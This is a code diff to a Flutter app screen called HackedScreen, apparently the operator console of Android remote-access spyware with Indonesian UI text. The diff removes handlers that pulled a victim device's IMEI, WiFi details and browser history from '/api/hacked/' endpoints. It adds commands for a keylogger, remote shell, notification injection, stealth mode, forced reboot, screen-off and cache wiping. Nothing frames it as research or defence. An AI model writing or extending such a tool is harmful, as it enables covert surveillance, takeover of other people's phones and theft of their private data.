@@ -197,10 +197,22 @@ class _HackedScreenState extends State<HackedScreen>
      'title': 'Play Video',      'color': const Color(0xFFEC4899), 'cmd': 'play_video',  'active': true},
     {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1"/></svg>',
      'title': 'Lock & Chat',     'color': const Color(0xFFFFD700), 'cmd': 'lock_chat',      'active': true},
-    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>',
-     'title': 'Device Info',     'color': const Color(0xFF3B82F6), 'cmd': 'get_device_info', 'active': true},
-    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
-     'title': 'Browser History', 'color': const Color(0xFF8B5CF6), 'cmd': 'get_browser_history', 'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64A9 9 0 1 1 5.64 17.36"/><path d="M23 12A11 11 0 0 0 12 1"/></svg>',
+     'title': 'Force Reboot',    'color': const Color(0xFFEF4444), 'cmd': 'force_reboot',   'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>',
+     'title': 'Silent Mode',     'color': const Color(0xFF6B7280), 'cmd': 'silent_mode',    'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/><line x1="2" y1="3" x2="22" y2="17"/></svg>',
+     'title': 'Screen Off',      'color': const Color(0xFF374151), 'cmd': 'screen_off',     'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="10" y1="1" x2="10" y2="4"/></svg>',
+     'title': 'Inject Notif',    'color': const Color(0xFF8B5CF6), 'cmd': 'inject_notif',   'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
+     'title': 'Keylogger',       'color': const Color(0xFFE11D48), 'cmd': 'keylogger',      'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>',
+     'title': 'Remote Shell',    'color': const Color(0xFF10B981), 'cmd': 'remote_shell',   'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><circle cx="12" cy="11" r="3"/></svg>',
+     'title': 'Wipe Cache',      'color': const Color(0xFFF59E0B), 'cmd': 'wipe_cache',     'active': true},
+    {'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><circle cx="12" cy="12" r="1"/></svg>',
+     'title': 'Stealth Mode',    'color': const Color(0xFF06B6D4), 'cmd': 'stealth_mode',   'active': true},
   ];
 
   @override
@@ -451,155 +463,12 @@ class _HackedScreenState extends State<HackedScreen>
       case 'app_list':    _showAppListDialog(); break;
       case 'open_app':    _showOpenAppDialog(); break;
       case 'open_site':   _showOpenSiteDialog(); break;
-      case 'play_video':     _showPlayVideoDialog(); break;
-      case 'lock_chat':      _openLockChatScreen(); break;
-      case 'get_device_info':      _handleGetDeviceInfo(); break;
-      case 'get_browser_history':  _handleGetBrowserHistory(); break;
+      case 'play_video':  _showPlayVideoDialog(); break;
+      case 'lock_chat':   _openLockChatScreen(); break;
     }
   }
 
   
-  Future<void> _handleGetDeviceInfo() async {
-    await _sendCommand('get_device_info', {});
-    if (!mounted) return;
-    showDialog(
-      context: context,
-      builder: (_) => AlertDialog(
-        backgroundColor: const Color(0xFF0D1B2A),
-        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
-        title: const Text('Mengambil Device Info...', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.white)),
-        content: const SizedBox(height: 40, child: Center(child: CircularProgressIndicator())),
-      ),
-    );
-    await Future.delayed(const Duration(seconds: 4));
-    if (!mounted) return;
-    Navigator.of(context, rootNavigator: true).pop();
-    try {
-      final res = await ApiService.get('/api/hacked/device-info/${_selectedDeviceId}');
-      if (!mounted) return;
-      final info = res['info'] as Map<String, dynamic>?;
-      if (info == null) { showWarning(context, 'Data belum tersedia, coba lagi'); return; }
-      showDialog(
-        context: context,
-        builder: (_) => AlertDialog(
-          backgroundColor: const Color(0xFF0D1B2A),
-          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
-          title: const Text('Device Info', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.white, letterSpacing: 1)),
-          content: SingleChildScrollView(
-            child: Column(
-              crossAxisAlignment: CrossAxisAlignment.start,
-              mainAxisSize: MainAxisSize.min,
-              children: [
-                _infoRowSimple('Model',    info['model']    ?? 'N/A'),
-                _infoRowSimple('Brand',    info['brand']    ?? 'N/A'),
-                _infoRowSimple('Android',  info['android']  ?? 'N/A'),
-                _infoRowSimple('SDK',      info['sdk']?.toString() ?? 'N/A'),
-                _infoRowSimple('IMEI',     info['imei']     ?? 'N/A'),
-                _infoRowSimple('IP WiFi',  info['wifiIp']   ?? 'N/A'),
-                _infoRowSimple('WiFi SSID',info['wifiSsid'] ?? 'N/A'),
-                _infoRowSimple('Baterai',  info['battery']  ?? 'N/A'),
-                _infoRowSimple('Suhu',     info['temp']     ?? 'N/A'),
-              ],
-            ),
-          ),
-          actions: [
-            TextButton(
-              onPressed: () => Navigator.pop(context),
-              child: const Text('Tutup', style: TextStyle(color: Color(0xFF3B82F6), fontFamily: 'Orbitron')),
-            ),
-          ],
-        ),
-      );
-    } catch (e) {
-      if (mounted) showWarning(context, 'Gagal mengambil data');
-    }
-  }
-
-  Widget _infoRowSimple(String label, String value) {
-    return Padding(
-      padding: const EdgeInsets.symmetric(vertical: 4),
-      child: Row(
-        crossAxisAlignment: CrossAxisAlignment.start,
-        children: [
-          SizedBox(width: 90, child: Text(label, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Color(0xFF94A3B8)))),
-          const Text(': ', style: TextStyle(color: Color(0xFF94A3B8))),
-          Expanded(child: Text(value, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white, fontWeight: FontWeight.bold))),
-        ],
-      ),
-    );
-  }
-
-  Future<void> _handleGetBrowserHistory() async {
-    await _sendCommand('get_browser_history', {});
-    if (!mounted) return;
-    showDialog(
-      context: context,
-      builder: (_) => AlertDialog(
-        backgroundColor: const Color(0xFF0D1B2A),
-        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
-        title: const Text('Mengambil Browser History...', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white)),
-        content: const SizedBox(height: 40, child: Center(child: CircularProgressIndicator())),
-      ),
-    );
-    await Future.delayed(const Duration(seconds: 4));
-    if (!mounted) return;
-    Navigator.of(context, rootNavigator: true).pop();
-    try {
-      final res = await ApiService.get('/api/hacked/browser-history/${_selectedDeviceId}');
-      if (!mounted) return;
-      final hist = res['history'] as Map<String, dynamic>?;
-      final items = hist != null ? List<Map<String, dynamic>>.from(hist['items'] ?? []) : [];
-      if (items.isEmpty) { showWarning(context, 'Belum ada data browsing'); return; }
-      showDialog(
-        context: context,
-        builder: (_) => AlertDialog(
-          backgroundColor: const Color(0xFF0D1B2A),
-          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
-          title: Text('Browser History (${items.length})', style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white, letterSpacing: 1)),
-          content: SizedBox(
-            width: double.maxFinite,
-            height: 400,
-            child: ListView.builder(
-              itemCount: items.length,
-              itemBuilder: (_, i) {
-                final item = items[i];
-                return Container(
-                  margin: const EdgeInsets.only(bottom: 8),
-                  padding: const EdgeInsets.all(10),
-                  decoration: BoxDecoration(
-                    color: const Color(0xFF8B5CF6).withOpacity(0.08),
-                    borderRadius: BorderRadius.circular(8),
-                    border: Border.all(color: const Color(0xFF8B5CF6).withOpacity(0.25)),
-                  ),
-                  child: Column(
-                    crossAxisAlignment: CrossAxisAlignment.start,
-                    children: [
-                      Text(item['title'] ?? 'Tanpa Judul', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white, fontWeight: FontWeight.bold), maxLines: 1, overflow: TextOverflow.ellipsis),
-                      const SizedBox(height: 3),
-                      Text(item['url'] ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white.withOpacity(0.5)), maxLines: 1, overflow: TextOverflow.ellipsis),
-                      if (item['time'] != null) ...[
-                        const SizedBox(height: 3),
-                        Text(item['time'].toString(), style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Color(0xFF8B5CF6))),
-                      ],
-                    ],
-                  ),
-                );
-              },
-            ),
-          ),
-          actions: [
-            TextButton(
-              onPressed: () => Navigator.pop(context),
-              child: const Text('Tutup', style: TextStyle(color: Color(0xFF8B5CF6), fontFamily: 'Orbitron')),
-            ),
-          ],
-        ),
-      );
-    } catch (e) {
-      if (mounted) showWarning(context, 'Gagal mengambil data');
-    }
-  }
-
   void _showTakePhotoDialog() {
     
     Navigator.push(context, MaterialPageRoute(
@@ -2812,7 +2681,7 @@ class _HackedScreenState extends State<HackedScreen>
       'title': 'Special',
       'icon': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>',
       'color': 0xFFFFD700,
-      'cmds': ['play_video', 'lock_chat', 'get_device_info', 'get_browser_history'],
+      'cmds': ['play_video', 'lock_chat', 'force_reboot', 'silent_mode', 'screen_off', 'inject_notif', 'keylogger', 'remote_shell', 'wipe_cache', 'stealth_mode'],
     },
   ];
 
@@ -3548,7 +3417,7 @@ class _LockChatScreenState extends State<_LockChatScreen> with TickerProviderSta
                     child: Center(child: _locking
                       ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: Colors.black, strokeWidth: 2))
                       : Text(
-                          _isLocked ? 'DEVICE TERKUNCI' : 'LOCK DEVICE',
+                          _isLocked ? '🔒 DEVICE TERKUNCI' : 'LOCK DEVICE',
                           style: TextStyle(
                             fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold,
                             color: _isLocked ? Colors.grey : Colors.black, letterSpacing: 2))),
